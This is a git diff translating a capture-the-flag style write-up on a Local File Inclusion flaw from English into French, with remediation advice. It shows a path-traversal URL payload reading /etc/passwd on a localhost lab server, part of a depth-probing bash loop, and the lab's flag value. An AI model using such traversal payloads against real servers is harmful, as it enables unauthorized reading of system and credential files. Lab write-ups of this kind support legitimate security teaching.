@@ -1,31 +1,23 @@
-# Local File Inclusion (LFI) - Detection Process
+# Inclusion de Fichiers Locaux (LFI) - Processus de Détection
 
-## Vulnerability Detected
+## Vulnérabilité Détectée
 
-The web application contains a **Local File Inclusion (LFI)** vulnerability that allows reading arbitrary files on the server.
+L'application web contient une vulnérabilité **Local File Inclusion (LFI)** qui permet de lire des fichiers arbitraires sur le serveur.
 
-## Detection Process
-
-### 1. Attack Vector Identification
-
-While analyzing the application, we identified a suspicious GET parameter in the URL:
+Lors de l'analyse de l'application, nous avons identifié un paramètre GET suspect dans l'URL :
 ```
 http://localhost:8080/index.php?page=<value>
 ```
 
-The `page` parameter appears to be used for dynamic file inclusion.
+Le paramètre `page` semble être utilisé pour l'inclusion dynamique de fichiers.
 
-### 2. Initial Path Traversal Test
-
-We attempted to access a sensitive system file (`/etc/passwd`) using the **path traversal** technique with `../` sequences:
+On tente d'accéder à un fichier système sensible (`/etc/passwd`) en utilisant la technique **path traversal** avec des séquences `../` :
 
 ```
 http://localhost:8080/index.php?page=/../../../../../../../etc/passwd
 ```
 
-### 3. Automation to Determine Required Depth
-
-To find the exact number of directory traversals (`../`) needed, we used an automated script:
+Script pour trouver pour trouver le nombre exact de traversées de répertoires (`../`) nécessaires: 
 
 ```bash
 for i in {0..8}; do
@@ -33,38 +25,56 @@ for i in {0..8}; do
 done
 ```
 
-### 4. Response Analysis
 
-The server returned different JavaScript alerts depending on the depth:
-- `0-5 traversals`: Various error messages ("Wtf ?", "Wrong..", "Nope..", "Almost.", "Still nope..")
-- `6 traversals`: **"Nope.."**
-- `7 traversals`: **"Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0"**
-- `8 traversals`: Same result as 7
-
-### 5. Successful Exploitation
-
-Exploitation with **7 `../` sequences** successfully reached the `/etc/passwd` file and triggered the validation:
+Le serveur a renvoyé différentes alertes JavaScript selon la profondeur :
+- `0-5 traversées` : Différents messages d'erreur ("Wtf ?", "Wrong..", "Nope..", "Almost.", "Still nope..")
+- `6 traversées` : **"Nope.."**
+- `7 traversées` : **"Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0"**
+- `8 traversées` : Même résultat que 7
 
 ```
 http://localhost:8080/index.php?page=../../../../../../../etc/passwd
 ```
 
-## Vulnerability Impact
+## Impact de la Vulnérabilité
 
-This vulnerability allows an attacker to:
-- Read sensitive system files (`/etc/passwd`, `/etc/shadow`, etc.)
-- Access application configuration files
-- Potentially discover critical information (credentials, API keys, etc.)
-- Exfiltrate application source code
+Cette vulnérabilité permet à un attaquant de :
+- Lire des fichiers système sensibles (`/etc/passwd`, `/etc/shadow`, etc.)
+- Accéder aux fichiers de configuration de l'application
+- Découvrir des informations critiques (identifiants, clés API, etc.)
+- Exfiltrer le code source de l'application
 
-## Recommendations
+## Comment se Protéger
 
-1. **Strict input validation**: Whitelist accepted values for the `page` parameter
-2. **Path traversal sanitization**: Use `basename()` or `realpath()` to eliminate `../` sequences
-3. **Chroot or access restriction**: Limit file access to a specific directory
-4. **Avoid dynamic inclusion**: Use a secure routing system instead of directly including files based on user parameters
+Exemple : utiliser basename() pour supprimer les niveaux d'ecces au path "../"
+
+```bash
+echo "Input: ../../../etc/passwd"
+echo "Après basename: $(php -r 'echo basename("../../../etc/passwd");')"
+```
+
+## Recommandations de Sécurité
+
+- Validation Stricte des Entrées : utiliser une liste blanche (whitelist) de valeurs acceptées, valider les données rentrées par l'utilisateur
+
+- Nettoyage des Chemins (Path Sanitization) : Utiliser `basename()` pour éliminer les séquences `../`, `realpath()` pour résoudre le chemin absolu, vérifier que le chemin final reste dans le répertoire autorisé
+
+- Limiter l'accès aux fichiers à un répertoire spécifique
+- Configurer les permissions du système de fichiers correctement
+- Utiliser un environnement chroot si possible
+
+- Utiliser un système de routing sécurisé notamment avec des frameworks modernes
+- Éviter les fonctions `include()`, `require()` avec des paramètres utilisateur
+
+- Configuration du Serveur, dans le php.ini en php
+
+- Logger toutes les tentatives d'accès suspectes
+- Mettre en place des alertes pour les patterns d'attaque
+- Analyser régulièrement les logs pour détecter les tentatives d'exploitation
 
 ### Sources
-OWASP
-Claude
+- OWASP - Path Traversal
+- OWASP - File Inclusion Vulnerabilities
+- CWE-22: Improper Limitation of a Pathname to a Restricted Directory
+- Claude AI
 
